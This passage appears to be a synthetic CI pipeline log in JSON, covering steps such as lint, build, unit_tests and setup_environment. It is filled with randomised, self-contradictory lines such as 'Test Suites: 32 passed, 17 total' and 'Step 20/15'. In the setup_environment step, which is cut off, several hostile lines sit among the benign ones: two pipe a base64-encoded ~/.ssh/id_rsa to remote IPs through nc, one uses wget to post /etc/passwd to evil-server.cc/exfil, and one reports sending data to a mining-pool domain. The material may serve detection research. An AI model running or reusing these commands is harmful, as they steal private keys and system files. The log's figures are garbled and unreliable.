          "[12:46:42] INFO: Connecting to database",
          "[12:46:42] DEBUG: Query executed in 90ms",
          "Done.",
          "Test Suites: 32 passed, 17 total",
          "Artifact uploaded: dist.zip (90MB)",
          "Cache restored successfully (222MB)",
          "pip: Installing build dependencies...",
          "  PASS: unit/test_api_health.spec.js",
          "Environment: test",
          "Artifact downloaded: 45MB",
          "Processing...",
          "Fetching from https://registry.npmjs.org/package.json",
          "GET /api - 201 (22ms)",
          "Cache invalidated: node_modules",
          "Creating production build...",
          "Processing...",
          "[12:46:42] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Platform: linux-x64",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-30T12:48:05.871199",
        "finished_at": "2025-11-30T12:48:15.141561",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "GET /health - 204 (13ms)",
          "Bundling vendor.css",
          "[12:46:42] INFO: Request completed",
          "[12:46:42] DEBUG: Memory usage: 956MB",
          "Loading...",
          "\u2713 All checks passed",
          "[12:46:42] DEBUG: Query executed in 48ms",
          "[12:46:42] WARN: Deprecated API usage",
          "Waiting...",
          "pip: Collecting eslint",
          "TLS handshake completed",
          "WARNING: eslint has known vulnerabilities",
          "Checking out master branch",
          "Switched to branch 'feature/task-535'",
          "Already up to date.",
          "Step 14/15: Testing",
          "npm notice: created a lockfile",
          "Minifying vendor.js",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Using Node.js 18.3.2",
          "Generating source maps...",
          "\u2713 validate completed",
          "HEAD is now at 0e5c956",
          "Cache invalidated: node_modules",
          "Compiling components/main.py...",
          "\u2713 lint completed",
          "[12:46:42] ERROR: Connection failed",
          "[12:46:42] DEBUG: Query executed in 48ms",
          "Creating production build...",
          "[12:46:42] DEBUG: Memory usage: 1877MB",
          "Using Node.js 16.19.6",
          "Building Docker image...",
          "Step 11/17: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Layer 5/14: RUN command",
          "Fetching submodules...",
          "Switched to branch 'feature/task-912'",
          "[12:46:42] WARN: Deprecated API usage",
          "Already up to date.",
          "Processing...",
          "pip: Installing build dependencies...",
          "Using Node.js 20.15.1",
          "[12:46:42] ERROR: Connection failed",
          "[12:46:42] WARN: Deprecated API usage",
          "Ready.",
          "Test Suites: 40 passed, 30 total",
          "Step 5/21: Deploying",
          "Using Node.js 15.0.6",
          "Using Python 3.10",
          "Artifact uploaded: dist.zip (43MB)",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-9873",
          "Cache hit for key-6620",
          "Compiling utils/handler.rs...",
          "Artifact downloaded: 36MB",
          "Step 11/22: Running migrations",
          "Success!",
          "Ran 68 tests in 58s",
          "Artifact uploaded: dist.zip (93MB)",
          "Ready.",
          "[12:46:42] DEBUG: Memory usage: 1204MB",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-9995",
          "yarn add: Done in 13.9s",
          "TLS handshake completed",
          "TLS handshake completed",
          "Transforming 634 files...",
          "Step 17/17: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading axios-3.15.tar.gz",
          "[12:46:42] INFO: Request completed",
          "[12:46:42] DEBUG: Loading configuration",
          "Step 3/16: Running migrations",
          "[12:46:42] INFO: Processing request",
          "Step 3/21: Installing dependencies",
          "npm install: resolved 1120 packages",
          "Waiting...",
          "Waiting...",
          "npm install: resolved 982 packages",
          "Ran 33 tests in 33s",
          "npm install: added 78 packages",
          "Cache invalidated: dependencies",
          "Step 9/24: Installing dependencies",
          "Connection established",
          "\u2713 Step 'setup' succeeded",
          "Success!",
          "WARNING: lodash has known vulnerabilities",
          "Compiling components/service.java...",
          "Step 8/18: Deploying",
          "Environment: development",
          "Pushing to registry...",
          "Tests: 337 passed, 107 total",
          "Done.",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:42] DEBUG: Memory usage: 897MB",
          "pip: Collecting prettier",
          "[12:46:42] INFO: Connecting to database",
          "[12:46:42] DEBUG: Memory usage: 1716MB",
          "Minifying vendor.js",
          "npm install: added 443 packages",
          "\u2713 Task completed in 1866ms",
          "Creating production build...",
          "pip: Collecting jest",
          "Step 19/24: Testing",
          "Step 16/17: Running migrations",
          "Step 20/15: Building",
          "[12:46:42] DEBUG: Loading configuration",
          "WARNING: jest has known vulnerabilities",
          "pip: Downloading axios-5.15.tar.gz",
          "Building Docker image...",
          "Waiting...",
          "Processing...",
          "Waiting...",
          "  PASS: unit/test_auth_login.spec.js",
          "Fetching submodules...",
          "npm install: resolved 1920 packages",
          "\u2717 build failed with exit code 46",
          "Pulling image: node:latest",
          "Environment: staging",
          "Time: 97.662s",
          "Uploading artifact 'coverage' (17 files)",
          "[12:46:42] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "Ran 68 tests in 29s",
          "Exception: RuntimeError",
          "Compiling components/handler.rs...",
          "Uploading artifact 'coverage' (27 files)",
          "Already up to date.",
          "WARNING: express has known vulnerabilities",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:42] DEBUG: Query executed in 37ms",
          "Minifying vendor.js",
          "Step 17/18: Linting",
          "Environment: staging",
          "OK",
          "Snapshots: 20 passed, 33 total",
          "Step 14/16: Running migrations",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-30T12:48:15.141561",
        "finished_at": "2025-11-30T12:48:24.411923",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 217ms",
          "Cache hit for key-9830",
          "Artifact downloaded: 28MB",
          "Layer 9/14: RUN command",
          "Step 19/21: Deploying",
          "Environment: staging",
          "[12:46:42] INFO: Cache refreshed",
          "OK",
          "Processing...",
          "POST /data - 202 (68ms)",
          "Using Python 3.10",
          "Compiling utils/service.java...",
          "  PASS: unit/test_api_health.spec.js",
          "Coverage: 93% statements, 89% branches",
          "Already up to date.",
          "pip: Collecting express",
          "npm install: added 204 packages",
          "Installing prettier@3.7.7",
          "Cache hit for key-1840",
          "[12:46:42] DEBUG: Connection pool: 16 active",
          "Cache restored successfully (115MB)",
          "Cache saved successfully",
          "\u2713 deploy completed",
          "[12:46:42] DEBUG: Connection pool: 11 active",
          "Minifying main.js",
          "FAILED: test_cache_hit",
          "[12:46:42] WARN: Deprecated API usage",
          "Step 4/20: Running migrations",
          "Uploading artifact 'coverage' (45 files)",
          "Step 3/24: Testing",
          "Tests: 132 passed, 380 total",
          "NODE_ENV=test",
          "[12:46:42] DEBUG: Memory usage: 1318MB",
          "[12:46:42] DEBUG: Loading configuration",
          "Done.",
          "Cache saved successfully",
          "Success!",
          "POST /api - 202 (214ms)",
          "HEAD is now at 8035eb9",
          "Platform: darwin-arm64",
          "Using Node.js 17.7.10",
          "Layer 3/13: COPY command",
          "Step 4/18: Deploying",
          "Success!",
          "Already up to date.",
          "Artifact downloaded: 41MB",
          "[12:46:42] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (28MB)",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "[12:46:42] ERROR: Connection failed",
          "[12:46:42] INFO: Processing request",
          "OK",
          "Installing react@3.14.1",
          "[12:46:42] DEBUG: Connection pool: 6 active",
          "Fetching from https://googleapis.com/package.json",
          "Optimizing 74 modules...",
          "Fetching submodules...",
          "Layer 3/14: RUN command",
          "[12:46:42] INFO: Connecting to database",
          "Coverage: 90% statements, 83% branches",
          "Test Suites: 31 passed, 48 total",
          "Fetching submodules...",
          "npm install: resolved 443 packages",
          "Success!",
          "Building Docker image...",
          "Compiling utils/index.js...",
          "[12:46:42] WARN: Deprecated API usage",
          "[12:46:42] DEBUG: Query executed in 23ms",
          "Cache saved successfully",
          "Switched to branch 'feature/task-705'",
          "Step 18/16: Deploying",
          "Cache saved successfully",
          "Snapshots: 29 passed, 10 total",
          "Test Suites: 45 passed, 47 total",
          "[12:46:42] INFO: Starting build process",
          "[12:46:42] INFO: Cache refreshed",
          "Coverage: 95% statements, 88% branches",
          "OK",
          "Waiting...",
          "Artifact uploaded: dist.zip (100MB)",
          "NODE_ENV=test",
          "Generating source maps...",
          "Success!",
          "Snapshots: 35 passed, 16 total",
          "Cache restored successfully (365MB)",
          "Artifact downloaded: 4MB",
          "Step 12/20: Installing dependencies",
          "  PASS: test_user_create (169ms)",
          "Verifying...",
          "POST /api - 201 (427ms)",
          "yarn add: Done in 1.70s",
          "Compiling utils/main.py...",
          "yarn add: Done in 7.16s",
          "FAILED: test_user_create",
          "WARNING: axios has known vulnerabilities",
          "FAILED: test_cache_hit",
          "Building Docker image...",
          "Compiling src/app.ts...",
          "[12:46:42] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Step 2/24: Installing dependencies",
          "Finished.",
          "[12:46:42] INFO: Processing request",
          "\u2717 build failed with exit code 68",
          "Step 4/24: Building",
          "Time: 85.951s",
          "Step 1/21: Testing",
          "[12:46:42] DEBUG: Memory usage: 1544MB",
          "Cache invalidated: node_modules",
          "Checking out master branch",
          "Using Python 3.9",
          "Verifying...",
          "\u2713 Task completed in 3954ms",
          "Step 10/18: Installing dependencies",
          "pip: Downloading jest-2.10.tar.gz",
          "Compiling components/utils.go...",
          "npm install: resolved 1233 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "Compiling lib/index.js...",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Verifying...",
          "Compiling utils/main.py...",
          "Checking out master branch",
          "Building Docker image...",
          "\u2713 Step 'install' succeeded",
          "Minifying app.js",
          "Compiling utils/utils.go...",
          "[12:46:42] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 180 passed, 235 total",
          "Compiling utils/utils.go...",
          "npm install: added 448 packages",
          "Artifact uploaded: dist.zip (5MB)",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-30T12:48:24.411923",
        "finished_at": "2025-11-30T12:48:29.974140",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:46:42] DEBUG: Initializing service",
          "Completed.",
          "WARNING: prettier has known vulnerabilities",
          "Transforming 655 files...",
          "Fetching from https://docker.io/package.json",
          "Minifying app.js",
          "[12:46:42] INFO: Processing request",
          "Cache saved successfully",
          "Success!",
          "Test Suites: 16 passed, 49 total",
          "[12:46:42] ERROR: Connection failed",
          "POST /upload - 202 (12ms)",
          "Checking out master branch",
          "\u2713 Step 'checkout' succeeded",
          "Pushing to registry...",
          "Installing axios@3.0.0",
          "Finished.",
          "OK",
          "Artifact downloaded: 26MB",
          "Minifying main.js",
          "Compiling utils/handler.rs...",
          "yarn add: Done in 29.7s",
          "[12:46:42] WARN: Deprecated API usage",
          "  PASS: e2e/test_auth_login.spec.js",
          "Checking out main branch",
          "Verifying...",
          "WARNING: react has known vulnerabilities",
          "Coverage: 91% statements, 99% branches",
          "[12:46:42] DEBUG: Connection pool: 15 active",
          "GET /health - 204 (68ms)",
          "Ran 42 tests in 22s",
          "Cache invalidated: build",
          "HEAD is now at 14d7329",
          "Waiting...",
          "Processing...",
          "Step 11/15: Running migrations",
          "Platform: darwin-arm64",
          "Step 13/24: Deploying",
          "Uploading artifact 'dist' (9 files)",
          "Using Python 3.9",
          "Exception: TypeError",
          "Bundling runtime.js",
          "Done.",
          "Compiling components/index.js...",
          "[12:46:42] DEBUG: Loading configuration",
          "npm install: resolved 335 packages",
          "[12:46:42] INFO: Connecting to database",
          "Pulling image: python:3.11",
          "OK",
          "[12:46:42] DEBUG: Initializing service",
          "WARNING: react has known vulnerabilities",
          "[12:46:42] DEBUG: Query executed in 86ms",
          "POST /data - 200 (123ms)",
          "Compiling lib/app.ts...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "pip: Downloading webpack-5.14.tar.gz",
          "Cache hit for key-7066",
          "Compiling src/main.py...",
          "Compiling utils/handler.rs...",
          "Fetching submodules...",
          "[12:46:42] DEBUG: Connection pool: 20 active",
          "Optimizing 38 modules...",
          "[12:46:42] ERROR: Connection failed",
          "Switched to branch 'hotfix/task-813'",
          "Step 7/16: Deploying",
          "Snapshots: 32 passed, 41 total",
          "WARNING: axios has known vulnerabilities",
          "  PASS: e2e/test_db_connect.spec.js",
          "POST /data - 200 (222ms)",
          "  PASS: unit/test_api_health.spec.js",
          "Compiling utils/service.java...",
          "Exception: TypeError",
          "Using Python 3.10",
          "Minifying app.js",
          "Finished.",
          "  PASS: e2e/test_user_create.spec.js",
          "Step 1/24: Testing",
          "Installing react@2.17.0",
          "TLS handshake completed",
          "npm install: added 175 packages",
          "Ready.",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:46:42] WARN: Deprecated API usage",
          "Connection established",
          "Platform: linux-x64",
          "GET /health - 201 (19ms)",
          "Minifying app.js",
          "Done.",
          "\u2713 Step 'build' succeeded",
          "Waiting...",
          "Processing...",
          "Cache restored successfully (402MB)",
          "Step 19/23: Building",
          "Bundling vendor.js",
          "Cache invalidated: build",
          "Creating production build...",
          "TLS handshake completed",
          "Step 17/25: Testing",
          "yarn add: Done in 10.45s",
          "Using Python 3.11",
          "Using Node.js 14.0.4",
          "Fetching from https://registry.npmjs.org/package.json",
          "Step 1/20: Running migrations",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "[12:46:42] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 36",
          "Ready.",
          "Installing lodash@3.6.8",
          "Layer 3/13: COPY command",
          "[12:46:42] DEBUG: Query executed in 47ms",
          "Bundling main.js",
          "Environment: production",
          "Generating source maps...",
          "Completed.",
          "Artifact uploaded: dist.zip (94MB)",
          "WARNING: axios has known vulnerabilities",
          "Layer 4/13: RUN command",
          "Installing eslint@3.15.8",
          "Platform: darwin-arm64",
          "npm install: added 319 packages",
          "Step 12/23: Running migrations",
          "\u2713 validate completed",
          "NODE_ENV=development",
          "Transforming 942 files...",
          "Uploading artifact 'coverage' (8 files)",
          "Optimizing 84 modules...",
          "Step 11/18: Running migrations",
          "Time: 120.861s",
          "[12:46:42] WARN: Deprecated API usage",
          "Compiling components/handler.rs...",
          "Cache saved successfully",
          "Creating production build...",
          "Compiling components/service.java...",
          "Compiling utils/app.ts...",
          "[12:46:42] DEBUG: Initializing service",
          "Checking out master branch",
          "HEAD is now at 7208c6b",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-30T12:48:29.974140",
        "finished_at": "2025-11-30T12:48:39.244502",
        "log_lines": [
          "=== Step: lint ===",
          "pip: Installing build dependencies...",
          "Ready.",
          "Step 10/19: Running migrations",
          "Building Docker image...",
          "Step 18/19: Deploying",
          "  PASS: test_api_health (336ms)",
          "WARNING: axios has known vulnerabilities",
          "npm notice: package.json updated",
          "Cache hit for key-5555",
          "Test Suites: 5 passed, 16 total",
          "Ready.",
          "Switched to branch 'hotfix/task-813'",
          "\u2713 Task completed in 3906ms",
          "Ready.",
          "Artifact downloaded: 18MB",
          "Processing...",
          "Step 14/21: Deploying",
          "npm notice: created a lockfile",
          "[12:46:42] DEBUG: Memory usage: 1711MB",
          "Cache miss for key-6239",
          "Artifact downloaded: 14MB",
          "Bundling main.css",
          "Fetching submodules...",
          "Using Python 3.9",
          "[12:46:42] DEBUG: Connection pool: 18 active",
          "Cache hit for key-5065",
          "Bundling vendor.js",
          "\u2713 Task completed in 2325ms",
          "Installing jest@2.14.2",
          "pip: Downloading eslint-2.11.tar.gz",
          "Transforming 915 files...",
          "NODE_ENV=test",
          "Checking out main branch",
          "yarn add: Done in 27.17s",
          "pip: Downloading jest-3.11.tar.gz",
          "npm install: resolved 1570 packages",
          "\u2713 Step 'test' succeeded",
          "pip: Installing build dependencies...",
          "[12:46:42] INFO: Starting build process",
          "Ran 131 tests in 49s",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (27MB)",
          "yarn add: Done in 10.48s",
          "OK",
          "Compiling utils/handler.rs...",
          "Cache hit for key-4092",
          "Snapshots: 21 passed, 19 total",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed axios-4.16",
          "[12:46:42] DEBUG: Initializing service",
          "WARNING: express has known vulnerabilities",
          "Already up to date.",
          "Finished.",
          "[12:46:42] WARN: Deprecated API usage",
          "[12:46:42] INFO: Connecting to database",
          "Pulling image: python:18",
          "[12:46:42] INFO: Connecting to database",
          "Compiling utils/service.java...",
          "[12:46:42] DEBUG: Query executed in 61ms",
          "Compiling utils/handler.rs...",
          "npm install: added 334 packages",
          "GET /api - 201 (45ms)",
          "Ran 99 tests in 50s",
          "  PASS: integration/test_db_connect.spec.js",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 Task completed in 1253ms",
          "Cache miss for key-6630",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "\u2713 lint completed",
          "Cache saved successfully",
          "[12:46:42] DEBUG: Memory usage: 1484MB",
          "[12:46:42] DEBUG: Query executed in 93ms",
          "[12:46:42] DEBUG: Memory usage: 843MB",
          "Waiting...",
          "Already up to date.",
          "Transforming 921 files...",
          "NODE_ENV=production",
          "Step 12/22: Building",
          "HEAD is now at bf2d58b",
          "Cache invalidated: build",
          "Pulling image: node:latest",
          "Connection established",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Step 18/15: Testing",
          "[12:46:42] DEBUG: Loading configuration",
          "pip: Collecting prettier",
          "[12:46:42] INFO: Cache refreshed",
          "\u2713 test completed",
          "Fetching from https://github.com/package.json",
          "  PASS: test_db_connect (484ms)",
          "Installing webpack@5.3.5",
          "Processing...",
          "[12:46:42] ERROR: Connection failed",
          "Ran 123 tests in 43s",
          "pip: Installing build dependencies...",
          "Waiting...",
          "Step 8/17: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Processing...",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=development",
          "Tests: 252 passed, 480 total",
          "Optimizing 91 modules...",
          "Environment: test",
          "Fetching from https://gcr.io/package.json",
          "Ready.",
          "Step 15/20: Running migrations",
          "[12:46:42] INFO: Cache refreshed",
          "Installing lodash@2.2.0",
          "Step 18/23: Linting",
          "yarn add: Done in 5.47s",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Ran 90 tests in 4s",
          "TLS handshake completed",
          "POST /api - 200 (18ms)",
          "POST /upload - 200 (255ms)",
          "Step 15/24: Deploying",
          "Ready.",
          "Connection established",
          "Step 20/15: Running migrations",
          "[12:46:42] DEBUG: Memory usage: 1383MB",
          "Generating source maps...",
          "Step 14/22: Linting",
          "Ran 87 tests in 42s",
          "Bundling vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_user_create (449ms)",
          "Processing...",
          "Fetching from https://googleapis.com/package.json",
          "Compiling lib/service.java...",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 17/23: Running migrations",
          "  PASS: test_db_connect (303ms)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-30T12:48:39.244502",
        "finished_at": "2025-11-30T12:49:07.055589",
        "log_lines": [
          "=== Step: build ===",
          "Cache saved successfully",
          "Completed.",
          "[12:46:42] WARN: Deprecated API usage",
          "Fetching from https://registry.npmjs.org/package.json",
          "Success!",
          "Waiting...",
          "Ready.",
          "[12:46:42] DEBUG: Initializing service",
          "Success!",
          "pip install: Successfully installed eslint-2.6",
          "TLS handshake completed",
          "Compiling utils/utils.go...",
          "Generating source maps...",
          "Using Python 3.9",
          "Step 8/17: Linting",
          "Step 1/22: Building",
          "Ready.",
          "[12:46:42] INFO: Request completed",
          "Image pulled successfully",
          "Compiling src/index.js...",
          "Compiling utils/utils.go...",
          "Fetching submodules...",
          "OK",
          "\u2717 build failed with exit code 78",
          "OK",
          "Compiling utils/app.ts...",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Image pulled successfully",
          "Step 19/23: Building",
          "Environment: production",
          "Artifact downloaded: 18MB",
          "Compiling lib/handler.rs...",
          "Ran 198 tests in 56s",
          "[12:46:42] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 465 files...",
          "Cache hit for key-5260",
          "Compiling lib/utils.go...",
          "\u2713 All checks passed",
          "Step 20/18: Installing dependencies",
          "[12:46:42] INFO: Starting build process",
          "Minifying app.js",
          "Uploading artifact 'build' (24 files)",
          "Cache saved successfully",
          "[12:46:42] DEBUG: Connection pool: 18 active",
          "pip: Collecting react",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=production",
          "Layer 10/8: COPY command",
          "pip: Downloading webpack-5.9.tar.gz",
          "Loading...",
          "[12:46:42] INFO: Processing request",
          "Coverage: 99% statements, 61% branches",
          "OK",
          "Platform: darwin-arm64",
          "[12:46:42] ERROR: Connection failed",
          "[12:46:42] DEBUG: Connection pool: 3 active",
          "[12:46:42] INFO: Connecting to database",
          "Cache invalidated: dependencies",
          "Time: 70.368s",
          "Pulling image: node:18",
          "Bundling main.css",
          "yarn add: Done in 2.19s",
          "Compiling src/index.js...",
          "Verifying...",
          "Step 4/18: Building",
          "\u2713 deploy completed",
          "Processing...",
          "Connection established",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (307MB)",
          "npm notice: created a lockfile",
          "[12:46:42] INFO: Processing request",
          "\u2713 Task completed in 1930ms",
          "Installing webpack@1.18.3",
          "HEAD is now at e0a6660",
          "HEAD is now at 1db46ad",
          "  PASS: integration/test_cache_hit.spec.js",
          "npm notice: created a lockfile",
          "POST /upload - 201 (112ms)",
          "Uploading artifact 'build' (6 files)",
          "Compiling lib/app.ts...",
          "Step 19/17: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:42] DEBUG: Query executed in 52ms",
          "Step 5/24: Installing dependencies",
          "Cache saved successfully",
          "Environment: staging",
          "Cache hit for key-9899",
          "Uploading artifact 'dist' (4 files)",
          "Tests: 234 passed, 105 total",
          "\u2713 Task completed in 3160ms",
          "[12:46:42] WARN: Deprecated API usage",
          "Verifying...",
          "Completed.",
          "Image pulled successfully",
          "Tests: 291 passed, 58 total",
          "Time: 14.612s",
          "HEAD is now at 1f992c4",
          "Checking out master branch",
          "Compiling components/index.js...",
          "pip: Downloading react-2.13.tar.gz",
          "[12:46:42] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (25MB)",
          "[12:46:42] INFO: Connecting to database",
          "Compiling lib/index.js...",
          "Step 7/20: Building",
          "TLS handshake completed",
          "[12:46:42] DEBUG: Initializing service",
          "POST /data - 200 (312ms)",
          "  PASS: test_cache_hit (36ms)",
          "Uploading artifact 'dist' (49 files)",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:42] DEBUG: Loading configuration",
          "Step 8/20: Building",
          "[12:46:42] WARN: Deprecated API usage",
          "[12:46:42] INFO: Connecting to database",
          "GET /health - 200 (97ms)",
          "Compiling utils/service.java...",
          "Connection established",
          "Step 9/18: Building",
          "POST /api - 201 (356ms)",
          "Pushing to registry...",
          "Compiling components/service.java...",
          "Snapshots: 10 passed, 15 total",
          "Processing...",
          "[12:46:42] DEBUG: Loading configuration",
          "Transforming 605 files...",
          "Connection established",
          "Waiting...",
          "Installing eslint@2.8.0",
          "Compiling lib/service.java...",
          "Cache invalidated: dependencies",
          "Snapshots: 30 passed, 4 total",
          "\u2713 Step 'build' succeeded",
          "\u2713 build completed",
          "Finished.",
          "[12:46:42] WARN: Deprecated API usage",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-30T12:49:07.055589",
        "finished_at": "2025-11-30T12:49:34.866676",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Ran 195 tests in 60s",
          "Pushing to registry...",
          "TLS handshake completed",
          "OK",
          "Step 17/15: Testing",
          "Artifact uploaded: dist.zip (70MB)",
          "[12:46:42] DEBUG: Memory usage: 579MB",
          "Artifact downloaded: 13MB",
          "pip install: Successfully installed lodash-2.14",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "Cache hit for key-4643",
          "Tests: 320 passed, 97 total",
          "Compiling src/main.py...",
          "[12:46:42] WARN: Deprecated API usage",
          "Step 8/24: Running migrations",
          "Completed.",
          "[12:46:42] DEBUG: Loading configuration",
          "Waiting...",
          "[12:46:42] DEBUG: Loading configuration",
          "Layer 1/15: ENV command",
          "Transforming 885 files...",
          "\u2713 deploy completed",
          "Transforming 547 files...",
          "GET /api - 204 (88ms)",
          "Fetching from https://npmjs.org/package.json",
          "GET /health - 200 (88ms)",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 73% statements, 73% branches",
          "GET /status - 204 (7ms)",
          "Cache hit for key-2405",
          "GET /status - 204 (29ms)",
          "[12:46:42] WARN: Deprecated API usage",
          "npm install: added 469 packages",
          "Fetching from https://amazonaws.com/package.json",
          "Compiling lib/main.py...",
          "Using Node.js 14.16.10",
          "[12:46:42] ERROR: Connection failed",
          "Creating production build...",
          "Platform: linux-x64",
          "OK",
          "[12:46:42] INFO: Connecting to database",
          "Installing eslint@2.12.9",
          "Artifact downloaded: 43MB",
          "Compiling components/handler.rs...",
          "Transforming 650 files...",
          "Step 6/22: Installing dependencies",
          "Installing axios@5.18.3",
          "Pulling image: python:latest",
          "Step 2/19: Running migrations",
          "[12:46:42] DEBUG: Memory usage: 168MB",
          "Done.",
          "Cache hit for key-6716",
          "Optimizing 80 modules...",
          "Time: 86.280s",
          "Compiling lib/index.js...",
          "Ran 67 tests in 48s",
          "Done.",
          "npm install: added 108 packages",
          "[12:46:42] INFO: Starting build process",
          "Compiling utils/handler.rs...",
          "Minifying main.js",
          "npm notice: package.json updated",
          "Using Python 3.11",
          "HEAD is now at 3beae9b",
          "Tests: 335 passed, 50 total",
          "Tests: 478 passed, 412 total",
          "Platform: linux-x64",
          "npm notice: package.json updated",
          "  PASS: test_cache_hit (324ms)",
          "npm install: resolved 1967 packages",
          "Finished.",
          "Step 13/18: Linting",
          "Pulling image: node:3.11",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_db_connect (120ms)",
          "Generating source maps...",
          "Cache saved successfully",
          "Compiling lib/main.py...",
          "Step 3/21: Testing",
          "Generating source maps...",
          "Cache miss for key-8542",
          "[12:46:42] INFO: Starting build process",
          "FAILED: test_api_health",
          "Finished.",
          "Completed.",
          "[12:46:42] WARN: Deprecated API usage",
          "Finished.",
          "HEAD is now at 9b93c6f",
          "\u2713 package completed",
          "Using Node.js 18.8.10",
          "POST /upload - 202 (139ms)",
          "Cache restored successfully (170MB)",
          "Snapshots: 45 passed, 10 total",
          "  PASS: e2e/test_db_connect.spec.js",
          "Completed.",
          "[12:46:42] INFO: Request completed",
          "npm notice: package.json updated",
          "Step 8/19: Building",
          "[12:46:42] WARN: Deprecated API usage",
          "Cache hit for key-3521",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Snapshots: 6 passed, 42 total",
          "Bundling styles.css",
          "Compiling components/service.java...",
          "yarn add: Done in 1.71s",
          "npm notice: created a lockfile",
          "Step 1/16: Building",
          "Cache restored successfully (65MB)",
          "[12:46:42] DEBUG: Query executed in 81ms",
          "Step 11/23: Deploying",
          "  PASS: test_user_create (17ms)",
          "[12:46:42] DEBUG: Initializing service",
          "Processing...",
          "FAILED: test_db_connect",
          "Success!",
          "Compiling src/index.js...",
          "Ran 134 tests in 6s",
          "POST /upload - 200 (446ms)",
          "Pulling image: alpine:3.11",
          "[12:46:42] INFO: Processing request",
          "pip: Installing build dependencies...",
          "Coverage: 99% statements, 98% branches",
          "HEAD is now at 51cc368",
          "Tests: 203 passed, 280 total",
          "[12:46:42] DEBUG: Memory usage: 1115MB",
          "Switched to branch 'bugfix/task-792'",
          "  PASS: integration/test_auth_login.spec.js",
          "Using Node.js 16.0.4",
          "[12:46:42] INFO: Starting build process",
          "Coverage: 80% statements, 65% branches",
          "\u2713 Task completed in 3475ms",
          "[12:46:42] WARN: Deprecated API usage",
          "Building Docker image...",
          "Step 16/18: Running migrations",
          "Step 10/20: Deploying",
          "Verifying...",
          "Step 6/17: Installing dependencies",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-30T12:49:34.866676",
        "finished_at": "2025-11-30T12:49:44.137038",
        "log_lines": [
          "=== Step: setup_environment ===",
          "pip: Collecting axios",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 77.191.192.16 4128",
          "[12:46:42] WARN: Deprecated API usage",
          "POST /upload - 200 (68ms)",
          "Cache miss for key-2236",
          "Snapshots: 9 passed, 11 total",
          "TLS handshake completed",
          "  PASS: test_cache_hit (136ms)",
          "[12:46:42] INFO: Connecting to database",
          "Loading...",
          "pip: Installing build dependencies...",
          "[12:46:42] WARN: Deprecated API usage",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Optimizing 99 modules...",
          "Sending 373MB of data to malicious-pool.xyz",
          "\u2713 Step 'checkout' succeeded",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 35.232.162.217 18399",
          "npm notice: created a lockfile",
          "NODE_ENV=development",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:46:42] WARN: Deprecated API usage",
          "Image pulled successfully",
